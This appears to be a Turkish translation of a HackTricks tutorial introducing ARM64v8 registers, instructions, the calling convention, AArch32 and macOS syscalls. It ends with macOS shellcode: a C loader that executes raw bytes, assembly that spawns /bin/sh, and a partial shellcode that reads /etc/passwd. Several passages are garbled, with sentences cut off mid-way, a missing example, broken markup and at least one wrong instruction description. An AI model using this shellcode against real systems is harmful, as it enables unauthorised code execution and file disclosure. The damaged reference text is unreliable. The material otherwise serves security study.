# ARM64v8 Giriş

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## **İstisna Seviyeleri - EL (ARM64v8)**

ARMv8 mimarisinde, İstisna Seviyeleri (EL'ler) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört istisna seviyesi bulunur ve her biri farklı bir amaç için kullanılır:

1. **EL0 - Kullanıcı Modu**:
* Bu, en düşük ayrıcalıklı seviyedir ve düzenli uygulama kodunu yürütmek için kullanılır.
* EL0'da çalışan uygulamalar, birbirlerinden ve sistem yazılımından izole edilir, böylece güvenlik ve kararlılık artırılır.
2. **EL1 - İşletim Sistemi Çekirdek Modu**:
* Çoğu işletim sistemi çekirdeği bu seviyede çalışır.
* EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır.
3. **EL2 - Hipervizör Modu**:
* Bu seviye, sanallaştırma için kullanılır. EL2'de çalışan bir hipervizör, aynı fiziksel donanımda çalışan birden çok işletim sistemini (her biri kendi EL1'inde) yönetebilir.
* EL2, sanal ortamların izolasyonu ve kontrolü için özellikler sağlar.
4. **EL3 - Güvenli Monitör Modu**:
* Bu, en ayrıcalıklı seviyedir ve genellikle güvenli önyükleme ve güvenilir yürütme ortamları için kullanılır.
* EL3, güvenli ve güvensiz durumlar arasındaki erişimleri yönetebilir ve kontrol edebilir (güvenli önyükleme, güvenilir işletim sistemi vb.).

Bu seviyelerin kullanımı, sistemdeki farklı bileşenlerin yapılandırılmış ve güvenli bir şekilde yönetilmesine olanak sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili bir şekilde izole ederek sistem güvenliğini ve sağlamlığını artırır.

## **Kayıtlar (ARM64v8)**

ARM64'ün **31 genel amaçlı kaydı** vardır ve `x0` ile `x30` olarak etiketlenmiştir. Her biri **64 bit** (8 bayt) bir değer depolayabilir. Yalnızca 32 bit değerler gerektiren işlemler için, aynı kayıtlara `w0` ile `w30` isimleri kullanılarak 32 bit modunda erişilebilir.

1. **`x0`** ile **`x7`** - Bunlar genellikle geçici kayıtlar olarak kullanılır ve alt programlara parametre aktarmak için kullanılır.
* **`x0`**, bir işlevin dönüş verisini taşır.
2. **`x8`** - Linux çekirdeğinde, `x8` `svc` talimatı için sistem çağrı numarası olarak kullanılır. **macOS'ta ise x16 kullanılır!**
3. **`x9`** ile **`x15`** - Daha fazla geçici kayıt, genellikle yerel değişkenler için kullanılır.
4. **`x16`** ve **`x17`** - **İç-içe Çağrı Kayıtları**. Hemen değerler için geçici kayıtlar. Ayrıca dolaylı işlev çağrıları ve PLT (Procedure Linkage Table) destekleri için kullanılır.
* **`x16`**, **macOS**'ta **`svc`** talimatı için **sistem çağrı numarası** olarak kullanılır.
5. **`x18`** - **Platform kaydı**. Genel amaçlı bir kayıt olarak kullanılabilir, ancak bazı platformlarda bu kayıt platforma özgü kullanımlar için ayrılmıştır: Windows'ta geçerli iş parçacığı ortam bloğuna işaretçi veya linux çekirdeğinde **yürütülen görev yapısına işaret etmek için**.
6. **`x19`** ile **`x28`** - Bunlar çağrıyı bekleyen kaydedilen kayıtlardır. Bir işlev, çağıranı için bu kayıtların değerlerini korumalıdır, bu nedenle değerler yığında depolanır ve çağırana dönmeden önce kurtarılır.
7. **`x29`** - Yığın çerçevesini takip etmek için **çerçeve işaretçisi**. Bir işlev çağrıldığında yeni bir yığın çerçevesi oluşturulduğunda, **`x29`** kaydedilir ve yeni çerçeve işaretçi adresi (**`sp`** adresi) bu kayda kaydedilir.
* Bu kayıt genel amaçlı bir kayıt olarak da kullanılabilir, ancak genellikle yerel değişkenlere referans olarak kullanılır.
8. **`x30`** veya **`lr`**- **Bağlantı kaydedici**. Bir `BL` (Branch with Link) veya `BLR` (Register ile Bağlantı ile Şube) talimatı yürütüldüğünde dönüş adresini tutar ve **`pc`** değerini bu kayda kaydederek **`lr`** (Bağlantı Kaydedici) içinde saklar.
* Diğer kayıtlar gibi kullanılabilir.
9. **`sp`** - **Yığın işaretçisi**, yığının en üstünü takip etmek için kullanılır.
* **`sp`** değeri her zaman en az bir **quadword** hizalamasında tutulmalıdır, aksi takdirde hizalama istisnası oluşabilir.
10. **`pc`** - **Program sayacı**, bir sonraki talimata işaret eder. Bu kayıt yalnızca istisna oluşturma, istisna dönüşleri ve dallanmalar aracılığıyla güncellenebilir. Bu kaydı okuyabilen tek sıradan talimatlar, **`pc`** adresini **`lr`** (Bağlantı Kaydedici) içinde
### **PSTATE**

**PSTATE**, işletim sistemi tarafından görülebilen **`SPSR_ELx`** özel kaydediciye seri hâlinde kodlanmış birkaç işlem bileşenini içerir. Burada X, tetiklenen istisna için **izin seviyesini** belirtir (bu, istisna sona erdiğinde işlem durumunun geri alınmasını sağlar). Erişilebilir alanlar şunlardır:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** ve **`V`** koşul bayrakları:
* **`N`**, işlemin negatif bir sonuç verdiğini gösterir.
* **`Z`**, işlemin sıfır verdiğini gösterir.
* **`C`**, işlemin taşıdığını gösterir.
* **`V`**, işlemin imzalı bir taşma verdiğini gösterir:
* İki pozitif sayının toplamı negatif bir sonuç verir.
* İki negatif sayının toplamı pozitif bir sonuç verir.
* Çıkarma işleminde, verilen bit boyutu aralığının içine sığdırılamayan büyük bir negatif sayı küçük bir pozitif sayıdan (veya tam tersi) çıkarıldığında.

{% hint style="warning" %}
Tüm talimatlar bu bayrakları güncellemez. **`CMP`** veya **`TST`** gibi bazı talimatlar bunu yapar ve **`ADDS`** gibi bir s takısına sahip olan diğer talimatlar da yapar.
{% endhint %}

* Geçerli **kayıt genişliği (`nRW`) bayrağı**: Bayrak 0 değerini tutarsa, program yeniden başlatıldığında AArch64 yürütme durumunda çalışacaktır.
* Geçerli **İstisna Seviyesi** (**`EL`**): EL0'da çalışan bir normal programın değeri 0 olacaktır.
* **Tek adımlama** bayrağı (**`SS`**): Hata ayıklama araçları tarafından tek adımlama yapmak için SS bayrağını **`SPSR_ELx`** içinde 1 olarak ayarlamak için kullanılır. Program bir adım çalışacak ve tek adım istisnası oluşturacaktır.
* **Yasadışı istisna** durumu bayrağı (**`IL`**): Ayrıcalıklı bir yazılımın geçersiz bir istisna seviyesi aktarımı gerçekleştirdiğinde işaretlemek için kullanılır, bu bayrak 1 olarak ayarlanır ve işlemci yasadışı bir durum istisnası oluşturur.
* **`DAIF`** bayrakları: Bu bayraklar, ayrıcalıklı bir programın belirli harici istisnaları seçici olarak maskelemesine izin verir.
* **A** 1 ise, **asenkron hatalar** tetiklenecektir. **`I`**, harici donanım **Kesme İsteklerine** (IRQ'ler) yanıt vermek için yapılandırılır. ve F, **Hızlı Kesme İstekleri** (FIR'lar) ile ilgilidir.
* **Yığın işaretçisi seçimi** bayrakları (**`SPS`**): EL1 ve üzerinde çalışan ayrıcalıklı programlar, kendi yığın işaretçi kaydedicilerini ve kullanıcı modelini (örneğin `SP_EL1` ve `EL0` arasında) değiş tokuş yapabilir. Bu değiş tokuş, **`SPSel`** özel kaydediciye yazılarak gerçekleştirilir. Bu EL0'dan yapılamaz.

## **Çağrı Sözleşmesi (ARM64v8)**

ARM64 çağrı sözleşmesi, bir işlevin **ilk sekiz parametresinin** **`x0`** ile **`x7`** kaydedicilerinde geçirildiğini belirtir. **Ek** parametreler **yığın** üzerinde geçirilir. **Dönüş** değeri, sonuç **`x0`** kaydedicide veya **128 bit uzunluğunda** ise ayrıca **`x1`** kaydedicide geçirilir. **`x19`** ile **`x30`** ve **`sp`** kaydedicileri, işlev çağrıları arasında **korunmalıdır**.

Bir işlevi derleme dilinde okurken, **işlev giriş ve çıkış** kısımlarını arayın. **Giriş** genellikle **çerçeve işaretçisini (`x29`) kaydetmeyi**, yeni bir çerçeve işaretçisi **kurmayı** ve **yığın alanı tahsis etmeyi** içerir. **Çıkış** genellikle **kaydedilen çerçeve işaretçisini geri yüklemeyi** ve işlevden **dönmeyi** içerir.

### Swift'te Çağrı Sözleşmesi

Swift'in kendi **çağrı sözleşmesi** [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilir.

## **Ortak Talimatlar (ARM64v8)**

ARM64 talimatları genellikle **`opcode hedef, kaynak1, kaynak2`** formatına sahiptir, burada **`opcode`**, yapılacak işlemi (**add**, **sub**, **mov**, vb.) belirtir, **`hedef`**, sonucun depolanacağı **hedef** kaydediciyi, **`kaynak1`** ve **`kaynak2`** ise **kaynak** kaydedicileri belirtir. Kaynak kaydedicilerinin yerine anlık değerler de kullanılabilir.

* **`mov`**: Bir değeri bir **kaydediciden** başka bir kaydediciye **taşır**.
* Örnek: `mov x0, x1` — Bu, `x1` kaydedicisindeki değeri `x0` kaydedicisine taşır.
* **`ldr`**: Bellekten bir değeri bir **kaydediciye yükler**.
* Örnek: `ldr x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundaki değeri `x0` kaydedicisine yükler.
* **`str`**: Bir değeri bir **kaydediciden belleğe kaydeder**.
* Örnek: `str x0, [x1]` — Bu, `x0` kaydedicisindeki değeri `x1` tarafından işaret edilen bellek konumuna kaydeder.
* **`ldp`**: **Çift Kaydedici Yükleme**. Bu talimat, **ardışık bellek** konumlarından **iki kaydediciyi** yükler. Bellek adresi genellikle başka bir kaydedicinin değerine bir ofset eklenerek oluşturulur.
* Örnek: `ldp x0, x1, [x2]` — Bu, sırasıyla `x2` ve `x2 + 8` bellek konumlarındaki değerleri `x0` ve `x1` kaydedicilerine yükler.
* **`stp`**: **Çift Kaydedici Kaydetme**. Bu talimat, **ardışık bellek** konumlarına **iki kaydediciyi** kaydeder. Bellek adresi genellikle başka bir kaydedicinin değerine bir ofset eklenerek
* **`bfm`**: **Bit Filed Move**, bu işlemler bir değerden belirli bitleri kopyalar ve bunları başka bir konuma yerleştirir. **`#s`**, en sol bit konumunu belirtir ve **`#r`**, sağa döndürme miktarını belirtir.
* Bitfield move: `BFM Xd, Xn, #r`
* İşaretli Bitfield move: `SBFM Xd, Xn, #r, #s`
* İşaretsiz Bitfield move: `UBFM Xd, Xn, #r, #s`
* **Bitfield Extract and Insert:** Bir kayıttan bir bit alanını kopyalar ve başka bir kayda kopyalar.
* **`BFI X1, X2, #3, #4`** X2'nin 3. bitinden itibaren 4 biti X1'e ekler
* **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden başlayarak dört biti çıkarır ve bunları X1'e kopyalar
* **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti işaretler ve bunları X1'e 3. bit konumundan başlayarak yerleştirir, sağdaki bitleri sıfırlar
* **`SBFX X1, X2, #3, #4`** X2'den 3. bit konumundan başlayarak 4 bit çıkarır, bunları işaretler ve sonucu X1'e yerleştirir
* **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti sıfırlar ve bunları X1'e 3. bit konumundan başlayarak yerleştirir, sağdaki bitleri sıfırlar
* **`UBFX X1, X2, #3, #4`** X2'den 3. bit konumundan başlayarak 4 bit çıkarır ve sonucu sıfırlanmış olarak X1'e yerleştirir.
* **İşareti Genişlet X'e:** Bir değerin işaretini (veya işaretsiz sürümünde sadece 0'ları ekler) genişletir ve işlemler yapabilmek için:
* **`SXTB X1, W2`** W2'den X1'e (X2'nin yarısı olan W2'den) 64 biti doldurmak için bir baytın işaretini genişletir
* **`SXTH X1, W2`** W2'den X1'e (W2'den X1'e) 16 bitlik bir sayının işaretini genişletir 64 biti doldurmak için
* **`SXTW X1, W2`** W2'den X1'e (W2'den X1'e) bir baytın işaretini genişletir 64 biti doldurmak için
* **`UXTB X1, W2`** Bir bayta 0'ları (işaretsiz) ekler ve 64 biti doldurmak için W2'den X1'e ekler
* **`extr`:** Belirtilen **birleştirilmiş çift kayıtlardan** bitleri çıkarır.
* Örnek: `EXTR W3, W2, W1, #3` Bu, W1+W2'yi birleştirir ve W2'nin 3. bitinden W1'in 3. bitine kadar olan bitleri alır ve bunu W3'e kaydeder.
* **`bl`**: **Branch** with link, bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
* Örnek: `bl myFunction` — Bu, `myFunction` fonksiyonunu çağırır ve dönüş adresini `x30`'da saklar.
* **`blr`**: **Branch** with Link to Register, hedefin bir **registerda belirtildiği** bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
* Örnek: `blr x1` — Bu, `x1` içindeki adresi olan fonksiyonu çağırır ve dönüş adresini `x30`'da saklar.
* **`ret`**: **Alt programdan dön**, genellikle **`x30`** adresini kullanarak.
* Örnek: `ret` — Bu, `x30` içindeki dönüş adresini kullanarak mevcut alt programdan döner.
* **`cmp`**: İki kaydı karşılaştırır ve durum bayraklarını ayarlar. Hedef kaydı sıfır kaydına ayarlayan **`subs`**'ın bir takma adıdır. `m == n` ise kullanışlıdır.
* **`subs`** ile aynı sözdizimini destekler
* Örnek: `cmp x0, x1` — Bu, `x0` ve `x1` içindeki değerleri karşılaştırır ve durum bayraklarını buna göre ayarlar.
* **`cmn`**: **Negatif karşılaştırma** işlemi. Bu durumda, **`adds`**'in bir takma adıdır ve aynı sözdizimini destekler. `m == -n` ise kullanışlıdır.
* **tst**: Bir kaydın değerlerinden herhangi birinin 1 olup olmadığını kontrol eder (sonucu herhangi bir yere kaydetmeden ANDS gibi çalışır)
* Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
* **`b.eq`**: **Eşitse dal**, önceki `cmp` talimatına dayanarak.
* Örnek: `b.eq label` — Önceki `cmp` talimatı iki eşit değer bulursa, bu `label`'a atlar.
* **`b.ne`**: **Eşit değilse dal**. Bu talimat, koşul bayraklarını kontrol eder (önceki bir karşılaştırma talimatı tarafından ayarlandı) ve karşılaştırılan değerler eşit değilse bir etikete veya adrese dalış yapar.
* Örnek: `cmp x0, x1` talimatından sonra, `b.ne label` — `x0` ve `x1` içindeki değerler eşit değilse, bu `label`'a atlar.
* **`cbz`**: **Sıfır üzerinde karşılaştır ve dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eşitse bir etikete veya adrese dalış yapar.
* Örnek: `cbz x0, label` — `x0` içindeki değer sıfırsa, bu `label`'a atlar.
* **`cbnz`**: **Sıfır olmayan üzerinde karşılaştır ve dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eşit değilse bir etikete veya adrese dalış yapar.
* Örnek: `cbnz x0, label` — `x0` içindeki değer sıfır değilse, bu `label`'a atlar.
* **`adrp`**: Bir sembolün **sayfa adresini hesaplar** ve bir kayıtta saklar.
* Örnek: `adrp x0, symbol` — Bu, `symbol`'ün sayfa adresini hesaplar ve `x0` içinde saklar.
* **`ldrsw`**: Bellekten işaretle **32 bitlik** bir değeri yükler ve 64 bit olarak işaretle genişletir.
* Örnek: `ldrsw x0, [x1]` — Bu, `x1` tarafından işaretlenen bellek konumundan işaretle yüksek 32 bitlik bir değeri yükler, 64 bit olarak genişletir ve `x0` içinde saklar.
* **`stur`**: Bir kaydın değerini, başka bir kayıttan bir ofset kullanarak bir bellek konumuna saklar.
* Örnek: `stur x0, [x1, #4]` — Bu, `x1` içindeki adresden 4 bayt daha büyük olan bellek adresine `x0` içindeki değeri saklar.
* **`svc`** : Bir **sistem çağrısı** yapar. "Supervisor Call" anlamına gelir. İşlemci bu talimatı çalıştırdığında, kullanıcı modundan çekirdek moduna geçer ve **çekirdeğin sistem çağrısı işleme** kodunun bulunduğu belirli bir bellek konumuna atlar.
*   Örnek:

```armasm
mov x8, 93  ; Çıkış için sistem çağrısı numarasını (93) x8 kaydına yükler.
mov x0, 0   ; Çıkış durum kodunu (0) x0 kaydına yükler.
svc 0       ; Sistem çağrısı yapar.
```
### **Fonksiyon Prologu**

1. **Link kaydediciyi ve çerçeve işaretçisini yığıta kaydet**:

```armasm
stp x29, x30, [sp, #-16]!  ; x29 ve x30 çiftini yığıta kaydet ve yığıt işaretçisini azalt
```

2. **Yeni çerçeve işaretçisini ayarla**: `mov x29, sp` (geçerli fonksiyon için yeni çerçeve işaretçisini ayarlar)
3. **Yerel değişkenler için yığıtta yer ayır** (gerekiyorsa): `sub sp, sp, <boyut>` (<boyut>, ihtiyaç duyulan bayt sayısıdır)

### **Fonksiyon Epilogu**

1. **Yerel değişkenleri geri al (eğer ayrıldıysa)**: `add sp, sp, <boyut>`
2. **Link kaydediciyi ve çerçeve işaretçisini geri yükle**:

```armasm
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (çağrıyı, bağlantı kaydedicideki adrese kullanarak çağrıyı geri döndürür)

## AARCH32 Yürütme Durumu

Armv8-A, 32 bitlik programların yürütülmesini destekler. **AArch32**, **`A32`** ve **`T32`** olmak üzere **iki talimat setinden** birinde çalışabilir ve **`interworking`** aracılığıyla bunlar arasında geçiş yapabilir.\
**Ayrıcalıklı** 64 bitlik programlar, daha düşük ayrıcalıklı 32 bitlik bir programa istisna seviye transferi gerçekleştirerek 32 bitlik programların yürütülmesini planlayabilir.\
64 bitlikten 32 bitliğe geçiş, istisna seviyesinin düşürülmesiyle gerçekleşir (örneğin, EL1'de 64 bitlik bir programın EL0'da bir programı tetiklemesi). Bu, **`AArch32`** işlem süreci işletilmeye hazır olduğunda **`SPSR_ELx`** özel kaydedicinin **4. bitini 1** olarak ayarlayarak ve `SPSR_ELx`'in geri kalanı **`AArch32`** programlarının CPSR'ini depolayarak yapılır. Ardından, ayrıcalıklı işlem **`ERET`** talimatını çağırır, böylece işlemci **`AArch32`**'ye geçiş yapar ve CPSR'ye bağlı olarak A32 veya T32'ye girer.

**`Interworking`**, CPSR'nin J ve T bitlerini kullanarak gerçekleştirilir. `J=0` ve `T=0` **`A32`**'i, `J=0` ve `T=1` **T32**'yi temsil eder. Bu, talimat setinin T32 olduğunu belirtmek için **en düşük bitin 1** olarak ayarlanması anlamına gelir.\
Bu, **interworking dallanma talimatları** sırasında ayarlanır, ancak PC hedef kaydedici olarak ayarlandığında diğer talimatlarla doğrudan ayarlanabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registerler

16 adet 32-bit register bulunmaktadır (r0-r15). **r0'dan r14'e** kadar olanlar **herhangi bir işlem** için kullanılabilir, ancak bazıları genellikle ayrılmıştır:

* **`r15`**: Program sayacı (her zaman). Bir sonraki komutun adresini içerir. A32'de mevcut + 8, T32'de mevcut + 4.
* **`r11`**: Çerçeve İşaretçisi
* **`r12`**: İç-prosedürel çağrı kaydedici
* **`r13`**: Yığın İşaretçisi
* **`r14`**: Bağlantı Kaydedici

Ayrıca, registerler **`banked registerlerde`** yedeklenir. Bu, istisna işleme ve ayrıcalıklı işlemlerde hızlı bağlam geçişini gerçekleştirmek için register değerlerini depolayan yerlerdir. Registerleri her seferinde manuel olarak kaydetme ve geri yükleme ihtiyacını önlemek için bu işlem **CPSR**'den işlemcinin alındığı işlem modunun **SPSR**'ine işlemci durumunu kaydetmek suretiyle yapılır. İstisna dönüşlerinde, **CPSR** **SPSR**'den geri yüklenir.

### CPSR - Mevcut Program Durumu Kaydedici

AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve ayrıcalık alındığında **`SPSR_ELx`**'de depolanır ve daha sonra yürütme geri yüklenir:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Alanlar bazı gruplara ayrılmıştır:

* Uygulama Program Durumu Kaydedici (APSR): Aritmetik bayraklar ve EL0'den erişilebilir.
* Yürütme Durumu Kaydedicileri: İşlem davranışı (işletim sistemi tarafından yönetilir).

#### Uygulama Program Durumu Kaydedici (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'te olduğu gibi)
* **`Q`** bayrağı: Özel bir doyurmalı aritmetik talimatının yürütülmesi sırasında **tamsayı doygunluğu oluştuğunda** 1 olarak ayarlanır. Bir kez **1** olarak ayarlandıktan sonra, manuel olarak 0 olarak ayarlanana kadar değeri korur. Ayrıca, değeri zımni olarak kontrol eden herhangi bir talimat yoktur, manuel olarak okunarak yapılmalıdır.
* **`GE`** (Büyük veya eşit) Bayraklar: SIMD (Tek Talimat, Çoklu Veri) işlemlerinde kullanılır, örneğin "paralel toplama" ve "paralel çıkarma". Bu işlemler, birden fazla veri noktasını tek bir talimatla işleme imkanı sağlar.

Örneğin, **`UADD8`** talimatı, paralel olarak dört çift baytı (iki 32-bit operand) toplar ve sonuçları bir 32-bit registerda depolar. Ardından, bu sonuçlara dayanarak **`APSR`**'deki **`GE`** bayraklarını ayarlar. Her GE bayrağı, bayt toplamalarından birine karşılık gelir ve o bayt çifti için toplamanın **taşması durumunda** eklemenin taşması durumunu gösterir.

**`SEL`** talimatı, bu GE bayraklarını koşullu eylemler gerçekleştirmek için kullanır.

#### Yürütme Durumu Kaydedicileri

* **`J`** ve **`T`** bitleri: **`J`** 0 olmalı ve **`T`** 0 ise A32 talimat seti kullanılır, 1 ise T32 kullanılır.
* **IT Blok Durumu Kaydedici** (`ITSTATE`): Bunlar 10-15 ve 25-26 bitleridir. Bir **`IT`** önekli grup içindeki talimatlar için koşulları depolarlar.
* **`E`** biti: **endianness**'ı gösterir.
* **Mod ve İstisna Maskesi Bitleri** (0-4): Mevcut yürütme durumunu belirler. 5. bit programın 32 bit (1) veya 64 bit (0) olarak çalıştığını belirtir. Diğer 4 bit, kullanılan **istisna modunu** belirtir (bir istisna oluştuğunda ve işlendiğinde). Sayı kümesi, bunun işlenirken başka bir istisna tetiklenirse **mevcut önceliği** belirtir.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Belirli istisnalar, **`A`**, `I`, `F` bitlerini kullanarak devre dışı bırakılabilir. **`A`** 1 ise, **asenkron hatalar** tetiklenecektir. **`I`**, harici donanım **Kesme İstekleri**'ne (IRQ) yanıt vermek için yapılandırılır ve F, **Hızlı Kesme İstekleri**'ne (FIR) ilişkilidir.

## macOS

### BSD sistem çağrıları

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) adresine bakın. BSD sistem çağrıları **x16 > 0** olacaktır.

### Mach Traps

[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) adresine bakın. Mach tuzakları **x16 < 0** olacaktır, bu nedenle önceki listedeki numaraları eksi işaretiyle çağırmalısınız: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.

Bu (ve BSD) sistem çağrılarını nasıl çağıracağınızı bulmak için bir disassemblerda **`libsystem_kernel.dylib`**'i kontrol edebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Bazen, kaynak kodunu kontrol etmek yerine **`libsystem_kernel.dylib`**'den **derlenmiş** kodu kontrol etmek daha kolay olabilir çünkü birkaç sistem çağrısının (BSD ve Mach) kodu betikler aracılığıyla oluşturulur (kaynak kodunda yorumları kontrol edin), oysa dylib içinde neyin çağrıldığını bulabilirsiniz.
{% endhint %}

### Kabuk Kodları

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Baytları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Kodun çalıştırılması için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**Buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.

{% tabs %}
{% tab title="adr ile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="yığın ile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% tabs %}
{% tab title="cat ile oku" %}
Hedef, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu nedenle ikinci argüman (x1), parametrelerin bir dizisi (bellekte bir adres yığını anlamına gelir) olmalıdır.
{% endtab %}
{% endtabs %}
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
